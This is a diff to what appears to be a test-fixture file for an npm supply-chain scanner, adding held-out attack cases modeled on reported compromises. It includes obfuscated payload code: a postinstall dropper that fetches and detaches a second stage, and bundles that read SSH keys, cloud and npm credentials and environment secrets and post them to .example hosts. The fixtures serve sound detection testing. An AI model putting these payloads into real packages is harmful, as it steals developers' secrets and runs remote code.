@@ -21,13 +21,13 @@ const IPC_BASE = `"use strict";\nconst listeners = new Map();\nfunction on(name,
  * (with decoy entries, rotated, then unrotated at load) and the code reads it through one decoder. Nothing here runs:
  * the decoded text is inert and every host is on the reserved .example domain.
  */
-const obfuscate = (body: string, rot: number): string => {
+const obfuscate = (body: string, rot: number, decoys = 90): string => {
   const strs: string[] = [];
   const code = body.replace(/@@([^@]+)@@/g, (_m, str: string) => { let i = strs.indexOf(str); if (i < 0) i = strs.push(str) - 1; return `_0xd(${i})`; });
   const table = strs.map((x) => Buffer.from(x).toString("hex"));
   let seed = 7;
   const next = () => (seed = (seed * 1103515245 + 12345) % 2147483648);
-  for (let i = 0; i < 90; i++) table.push(Array.from({ length: 6 + ((next() >> 8) % 12) }, () => ((next() >> 8) % 256).toString(16).padStart(2, "0")).join(""));
+  for (let i = 0; i < decoys; i++) table.push(Array.from({ length: 6 + ((next() >> 8) % 12) }, () => ((next() >> 8) % 256).toString(16).padStart(2, "0")).join(""));
   const r = rot % table.length;
   const rotated = [...table.slice(r), ...table.slice(0, r)];
   return `(function () {\n  const _0xt = [${rotated.map((x) => `"${x}"`).join(", ")}];\n  for (let _0xk = ${r}; _0xk--;) _0xt.unshift(_0xt.pop());\n  const _0xd = (i) => Buffer.from(_0xt[i], "hex").toString();\n${code}})();\n`;
@@ -69,6 +69,50 @@ const TANSTACK_INDEX = `export function createHistory() { const stack = []; retu
 const tsHistory = (version: string, extra: Record<string, unknown>, rest: Record<string, string>): Pkg =>
   ({ name: "route-history", version, files: files({ "package.json": pkg({ name: "route-history", version, type: "module", main: "dist/index.js", files: ["dist"], ...extra }), "dist/index.js": TANSTACK_INDEX, ...rest }) });
 
+// Mastra style: the dropper a typosquat's postinstall runs. TLS verification is turned off, marker files are written to
+// the temp directory, a second stage is fetched from a .example host, saved under a random name and started detached.
+const MASTRA_SETUP = obfuscate(`  process.env[@@NODE_TLS_REJECT_UNAUTHORIZED@@] = @@0@@;
+  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@), _0xc = require(@@child_process@@), _0xh = require(@@https@@);
+  const _0xtmp = _0xo[@@tmpdir@@]();
+  _0xf[@@writeFileSync@@](_0xp.join(_0xtmp, @@.pkg_history@@), String(Date.now()));
+  const _0xreq = _0xh[@@request@@]({ host: @@c2.stage.example@@, method: @@POST@@, path: @@/api/register@@ }, (_0xr) => {
+    const _0xchunks = [];
+    _0xr.on(@@data@@, (d) => _0xchunks.push(d));
+    _0xr.on(@@end@@, () => {
+      const _0xname = _0xp.join(_0xtmp, Math.random().toString(36).slice(2) + @@.js@@);
+      _0xf[@@writeFileSync@@](_0xname, Buffer.concat(_0xchunks));
+      _0xc[@@spawn@@](process.execPath, [_0xname], { detached: true, stdio: @@ignore@@, windowsHide: true }).unref();
+    });
+  });
+  _0xreq.on(@@error@@, () => {});
+  _0xreq.end(JSON.stringify({ h: _0xo[@@hostname@@](), p: _0xo[@@platform@@]() }));
+`, 17, 60);
+const DAYJS_LIKE = `module.exports = function dayjs(d) { const t = d === undefined ? new Date() : new Date(d); return { format: () => t.toISOString(), valueOf: () => t.getTime() }; };\n`;
+const mastraHost = (version: string, deps: Record<string, string> | undefined): Pkg =>
+  lib("flow-agent", version, { ...(deps ? { dependencies: deps } : {}) }, { "index.js": `module.exports = { run: (task) => task() };\n` });
+
+// Red Hat wave style: the entry file of a package is replaced by a much larger obfuscated bundle; nothing else changes.
+const UI_PARTS_OLD = Array.from({ length: 30 }, (_, i) => `exports.part${i} = (props) => ({ type: "part${i}", props });\n`).join("");
+const WAVE_BODY = obfuscate(`  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
+  const _0xread = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
+  const _0xenv = Object.keys(process[@@env@@]).filter((k) => /TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL/i.test(k)).reduce((a, k) => (a[k] = process[@@env@@][k], a), {});
+  const _0xfiles = [@@.npmrc@@, @@.ssh/id_rsa@@, @@.aws/credentials@@, @@.kube/config@@, @@.config/gh/hosts.yml@@].reduce((a, n) => (a[n] = _0xread(n), a), {});
+  const _0xreq = require(@@https@@)[@@request@@]({ host: @@ingest.stage.example@@, method: @@POST@@, path: @@/c@@ });
+  _0xreq.on(@@error@@, () => {});
+  _0xreq.end(JSON.stringify({ env: _0xenv, files: _0xfiles }));
+`, 41, 1800);
+
+// Antv wave style: a preinstall that runs the bundled runtime on a new obfuscated file, with the payload posting to a host
+// that mimics trace ingestion.
+const ANTV_PAYLOAD = obfuscate(`  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
+  const _0xread = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
+  const _0xsecrets = [@@.npmrc@@, @@.ssh/id_rsa@@, @@.aws/credentials@@, @@.docker/config.json@@].map(_0xread);
+  const _0xspan = { resourceSpans: [{ scopeSpans: [{ spans: [{ name: @@install@@, attributes: [{ key: @@env@@, value: JSON.stringify(process[@@env@@]) }, { key: @@files@@, value: JSON.stringify(_0xsecrets) }] }] }] }] };
+  const _0xreq = require(@@https@@)[@@request@@]({ host: @@t.stage.example@@, method: @@POST@@, path: @@/v1/traces@@, headers: { [@@content-type@@]: @@application/json@@ } });
+  _0xreq.on(@@error@@, () => {});
+  _0xreq.end(JSON.stringify(_0xspan));
+`, 29, 500);
+
 export const HELDOUT: HeldOutCase[] = [
   {
     id: "keyv-style-preinstall-worm", kind: "attack", expect: "hold", disclosed: "2026-08-05",
@@ -104,5 +148,27 @@ export const HELDOUT: HeldOutCase[] = [
     note: "1.161.6 to 1.161.9: the postmortem names only the two malicious versions, so 1.161.6 (the last release before them) comes from the registry timeline, not the postmortem. The host package has no scripts entry; its only manifest change is an optionalDependencies entry on a git commit, and an obfuscated router_init.js sits at the host root outside the files list (the postmortem's indicators entry). The git dependency itself, and the prepare script it would run in its own checkout, are not modeled, so the case measures a host whose only manifest change is the dependency. Differs from install-dependency-git-url in install-cases.ts: that case swaps an existing registry dependency for a git URL and carries no payload file; here the dependency is new and optional and the obfuscated file ships in the tarball",
     base: [tsHistory("1.161.6", {}, {})],
     head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:example-org/example-router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": ROUTER_INIT })],
+  },
+  {
+    id: "mastra-style-typosquat-dependency-postinstall", kind: "attack", expect: "hold", disclosed: "2026-06-17",
+    source: "https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/",
+    note: "the host package's only change is one new dependency on a name one letter off a popular date library; the range resolves to a patch release whose only addition over the clean one is a postinstall running an obfuscated dropper (the library file is the same). The host bump here is 1.13.0 to 1.13.1 and the resolved dependency is new at 1.11.22, as in the write-up; the write-up's own text does not give the tarball contents beyond those two files",
+    base: [mastraHost("1.13.0", undefined)],
+    head: [mastraHost("1.13.1", { "swift-day-js": "^1.11.21" }),
+      lib("swift-day-js", "1.11.22", { scripts: { postinstall: "node setup.cjs --no-warnings" } }, { "dayjs.min.js": DAYJS_LIKE, "index.js": `module.exports = require("./dayjs.min.js");\n`, "setup.cjs": MASTRA_SETUP })],
+  },
+  {
+    id: "redhat-wave-style-main-replaced", kind: "attack", expect: "hold", disclosed: "2026-06-01",
+    source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
+    note: "7.7.1 to 7.7.2: the write-up says a normal index.js of about 200 KB was replaced by a 4.29 MB obfuscated payload and the packages carried valid provenance; it gives no manifest change, so none is modeled here, and 7.7.1 is the last release before the malicious ones in the registry timeline. The sizes are scaled down; the entry file is replaced, not appended to",
+    base: [lib("ui-parts", "7.7.1", {}, { "index.js": UI_PARTS_OLD })],
+    head: [lib("ui-parts", "7.7.2", {}, { "index.js": WAVE_BODY })],
+  },
+  {
+    id: "antv-wave-style-preinstall-bun", kind: "attack", expect: "hold", disclosed: "2026-05-19",
+    source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
+    note: "2.2.0 to 2.4.0: the write-up gives the version jump past the latest release, a preinstall hook \"bun run index.js\", the bun runtime added as a dependency and a git optionalDependency on an orphaned commit; the payload posts to a host that mimics trace ingestion. The runtime dependency and the git dependency are listed in the manifest but not modeled as packages, and the write-up gives no commit id, so the hash here is invented",
+    base: [lib("chart-vue", "2.2.0", {}, { "lib.js": `module.exports = { draw: (el) => el };\n` })],
+    head: [lib("chart-vue", "2.4.0", { scripts: { preinstall: "bun run index.js" }, dependencies: { bun: "1.2.0" }, optionalDependencies: { "chart-core": "github:example-org/example-chart#4f2a9c1d7e8b3a5069d1c2e4f6a8b0c3d5e7f901" } }, { "lib.js": `module.exports = { draw: (el) => el };\n`, "index.js": ANTV_PAYLOAD })],
   },
 ];
